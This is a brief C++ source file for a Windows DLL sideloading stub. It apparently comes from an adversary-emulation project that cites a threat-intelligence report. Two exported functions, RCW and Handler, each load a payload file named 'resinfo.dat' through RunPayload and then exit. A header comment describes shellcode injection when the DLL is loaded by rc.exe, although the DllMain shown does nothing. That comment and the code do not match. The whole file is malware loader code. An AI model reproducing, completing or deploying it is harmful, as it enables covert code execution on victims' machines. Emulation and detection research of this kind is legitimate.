#include <Windows.h>
#include "stub.hpp"

#define PAYLOAD_FILENAME "resinfo.dat"

/*
 * DllMain:
 *      About:
 *          If loaded by rc.exe, will create a thread to run the shellcode
 *          payload injection routine. Otherwise, simply returns.
 *      CTI:
 *          https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch(fdwReason) {
        case DLL_PROCESS_ATTACH:
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

__declspec(dllexport) void
RCW(void* a, void* b, void* c, void* d) {
    ExitProcess(RunPayload(PAYLOAD_FILENAME, FALSE));
}

__declspec(dllexport) void
Handler(void* a, void* b, void* c, void* d) {
    ExitProcess(RunPayload(PAYLOAD_FILENAME, FALSE));
}
